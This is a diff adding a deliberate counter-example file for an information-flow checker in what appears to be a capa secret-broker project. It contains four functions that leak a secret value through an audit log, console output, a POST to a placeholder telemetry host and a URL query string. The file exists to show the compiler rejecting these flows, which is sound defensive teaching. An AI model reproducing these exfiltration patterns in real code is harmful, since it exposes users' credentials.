@@ -1,0 +1,64 @@
+// leaky_configbroker.capa
+//
+// COUNTER-EXAMPLE. This file deliberately does the wrong thing so you
+// can watch the information-flow checker reject it. It is NOT part of the
+// broker and is never imported by configbroker.capa.
+//
+// Try it:
+//     python -m capa --check leaky_configbroker.capa
+//
+// You will see hard ERRORS: a @secret fetched value (ResolvedSecret.value)
+// reaches a public sink WITHOUT crossing the audited declassify in
+// resolve.capa. The four functions below cover the four exfiltration
+// channels a real secret manager must defend against:
+//
+//   1. writing the secret into the AUDIT LOG (Fs.write) -- the exact
+//      thing the audit trail must never contain,
+//   2. printing it to the CONSOLE / telemetry (Stdio.println),
+//   3. POSTing it to a telemetry/metrics endpoint (Net.post body), and
+//   4. smuggling it into the URL / query string of an outbound GET
+//      (Net.get argument) -- a classic covert exfil channel.
+//
+// Every function opts into @strict_ifc, which makes such a flow a compile
+// error, so the program refuses to build. The RIGHT way to let a secret
+// influence output is the audited slot bridge (resolve.render_slot),
+// which declassifies exactly one value into exactly one authorised
+// config slot with a recorded reason. These functions skip it, and the
+// compiler stops them.
+
+import domain
+
+// WRONG (1): writes the raw secret value straight into the audit log.
+// s.value is @secret, the interpolated string is @secret, and Fs.write
+// is a public sink. There is no declassify, so this is an unaudited
+// disclosure of a secret into the very file that must never carry one.
+@strict_ifc()
+fun leak_secret_to_audit(fs: Fs, s: ResolvedSecret)
+    match fs.write("out/audit.log", "resolved ${s.name} = ${s.value}\n")
+        Ok(_)  -> ()
+        Err(_) -> ()
+
+// WRONG (2): prints the secret value to the console. Same violation, a
+// different public sink (Stdio.println). Console output is telemetry.
+@strict_ifc()
+fun leak_secret_to_console(stdio: Stdio, s: ResolvedSecret)
+    stdio.println("DEBUG fetched ${s.name}=${s.value}")
+
+// WRONG (3): exfiltrates the secret in a telemetry POST body. Net.post
+// argument 2 (the body) is a public sink: the secret would leave the
+// program over the network. This is the exact "phone-home with the
+// secret" the capability + IFC model exists to prevent.
+@strict_ifc()
+fun leak_secret_via_telemetry(net: Net, s: ResolvedSecret)
+    match net.post("http://telemetry.example/collect", "secret=${s.value}")
+        Ok(_)  -> ()
+        Err(_) -> ()
+
+// WRONG (4): smuggles the secret into the query string of an outbound
+// GET. Net.get argument 0 (the URL) is a public sink: a secret in a URL
+// leaks via the request line, logs and referrers. Covert exfil, rejected.
+@strict_ifc()
+fun leak_secret_in_url(net: Net, s: ResolvedSecret)
+    match net.get("http://config.internal.example/beacon?v=${s.value}")
+        Ok(_)  -> ()
+        Err(_) -> ()
